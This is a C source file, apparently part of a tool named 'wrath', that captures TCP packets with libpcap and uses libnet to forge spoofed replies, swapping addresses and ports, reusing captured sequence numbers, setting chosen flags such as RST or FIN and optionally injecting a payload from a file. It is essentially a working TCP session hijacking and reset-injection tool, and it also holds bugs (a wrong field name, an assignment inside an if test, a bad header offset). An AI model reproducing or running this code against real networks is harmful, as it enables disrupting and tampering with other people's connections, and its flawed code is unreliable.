#include <libnet.h>
#include <pcap.h>
#include "wrath-structs.h"
#include "wrath-utils.h"

void wrath_build(u_char *, const u_char *, struct inject_package);

void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;
	struct inject_package i_pack;

	i_pack.stream = NULL;
	i_pack.length = 0;
	
	/* test for input file:
		if an input file exists, assume it contains all encoding information.
		read the file's data onto the heap.
		present the pointer to wrath_build.
	
	   if an input file does not exist see if an operation does.
	   
	   if an operation does not exist only pass null pointer.
	*/
	if (strcmp(cline_args->input_file,"\0") != 0) { // if a file has been specified
		// open read-only access
		printf("sending file\n");
		int payload_fd;	
		int file_length;
		u_char *injection;
		payload_fd = open(cline_args->input_file, O_RDONLY, 0);
		if ((file_length = file_size(payload_fd)) == -1)
			fatal_error("failed to get file size");
		if ((injection = (u_char *) malloc(file_length)) == NULL)
			fatal_error("failed to allocate memory for file contents");
		read(payload_fd, injection, file_length);
		// build up inject_package
		i_pack.stream = injection;
		i_pack.length = file_length;
		wrath_build(args, packet, i_pack);
		// maybe safe to free injection here?
		libnet_write(libnet_handle);
	} else {
		wrath_build(args, packet, i_pack);
		libnet_write(libnet_handle);
	}			
}

void wrath_build(u_char *args, const u_char *packet, struct inject_package i_pack) {
	struct lcp_package *package = (struct lcp_package *) args;
	libnet_t *libnet_handle = package->libnet_handle;
	struct arg_values *cline_args = package->cline_args;

	struct libnet_ipv4_hdr *iphdr;
	struct libnet_tcp_hdr *tcphdr;

	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport)); // ip_src and ip_dst are in_addr structs
	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));

	printf("TCP SUM: %d\n", (cline_args->tcp_fin + cline_args->tcp_rst + cline_args->tcp_syn + cline_args->tcp_ack + cline_args->tcp_urg + cline_args->tcp_psh));
	
	/* libnet_build_tcp */
	libnet_build_tcp(
	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
	ntohl(tcphdr->th_ack),		// +(calc_len(upper_level)),	// seq (pretend to be next packet)
	ntohl(tcphdr->th_seq),		// ack
	(cline_args->tcp_rst
	+ cline_args->tcp_fin
	+ cline_args->tcp_syn
	+ cline_args->tcp_ack
	+ cline_args->tcp_urg
	+ cline_args->tcp_psh),		// flags	
	4096,				// window size -- the higher this is the least likely fragmentation will occur
	0,				// checksum: 0 = libnet auto-fill
	0,				// URG pointer	
	0,				// len
	i_pack.stream,			// *payload (maybe app-level here)
	i_pack.len,			// payload length
	libnet_handle,			// pointer libnet context	
	0);				// ptag: 0 = build a new header
	
	libnet_build_ipv4(LIBNET_TCP_H, // length
	IPTOS_LOWDELAY,			// type of service
	libnet_get_prand(LIBNET_PRu16), // IP ID (serial)
	0,				// fragmentation
	128,				// TTL should be high to avoid being dropped in transit to a server
	IPPROTO_TCP,			// upper-level protocol
	0,				// checksum: 0 = libnet auto-fill
	iphdr->ip_dst.s_addr,  		// source (pretend to be destination)
	iphdr->ip_src.s_addr,  		// destination (pretend to be source)
	NULL,				// optional payload
	0,				// payload length
	libnet_handle,			// pointer libnet context
	0);				// ptag: 0 = build a new header	


	if (cline_args->sleep_time = -1) 	
		usleep(5000);		// jump out of the storm 
	else 
		usleep(cline_args->sleep_time);
}
